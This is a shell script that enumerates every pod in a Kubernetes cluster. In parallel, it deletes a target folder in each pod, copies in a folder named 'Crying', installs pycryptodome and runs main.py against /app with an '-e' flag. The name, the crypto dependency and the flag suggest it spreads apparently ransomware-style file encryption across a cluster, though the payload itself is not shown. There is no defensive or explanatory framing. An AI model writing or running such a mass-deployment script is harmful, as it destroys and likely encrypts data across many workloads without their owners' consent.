#!/bin/sh

# Define the folder to be copied
FOLDER_TO_PUSH="/Crying"
DESTINATION_FOLDER="/app/Crying"

# Ensure necessary tools are available
echo "Ensuring required tools are available..."
apk update && apk add --no-cache curl bash || {
    echo "Failed to install required tools."
    exit 1
}

# Install kubectl
apk add --no-cache curl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
mv kubectl /usr/local/bin/

# Get the list of pod IPs
POD_IPS=$(kubectl get pods -o wide --no-headers | awk '{print $6}')

# Loop through each IP in parallel
for IP in $POD_IPS; do
    {
        echo "Pinging Pod IP: $IP"
        if ping -c 4 $IP > /dev/null; then
            echo "Ping successful: $IP"

            # Get the pod name based on the IP
            POD_NAME=$(kubectl get pods -o wide --no-headers | grep "$IP" | awk '{print $1}')
            
            # Remove the existing folder in the pod to ensure overwrite
            echo "Removing existing folder in pod $POD_NAME..."
            kubectl exec "$POD_NAME" -- sh -c "rm -rf $DESTINATION_FOLDER" || {
                echo "Failed to remove existing folder in pod: $POD_NAME"
                exit 1
            }

            # Push folder to the pod
            echo "Attempting to push folder to pod $POD_NAME..."
            kubectl cp "$FOLDER_TO_PUSH" "$POD_NAME:/app" || {
                echo "Failed to push folder to pod: $POD_NAME"
                exit 1
            }
            echo "Folder successfully pushed to pod: $POD_NAME"

            # Install updates and dependencies in the pod
            kubectl exec "$POD_NAME" -- sh -c "apk update && apk add --no-cache python3 py3-pip" || {
                echo "Failed to install Python3 in pod: $POD_NAME"
                exit 1
            }

            # Install required Python library
            kubectl exec "$POD_NAME" -- sh -c "pip3 install pycryptodome --break-system-packages" || {
                echo "Failed to install PyCryptodome in pod: $POD_NAME"
                exit 1
            }
            
            # Execute the script inside the pod
            echo "Executing the script inside the pod $POD_NAME..."
            kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/main.py && python3 /app/Crying/main.py -p /app -e" || {
                echo "Failed to execute main.py in pod: $POD_NAME"
                exit 1
            }

            echo "Scripts executed successfully in pod: $POD_NAME"
        else
            echo "Failed to reach IP: $IP"
        fi
        echo "-----------------------------------"
    } &
done

# Wait for all background processes to complete
wait
echo "All tasks completed!"
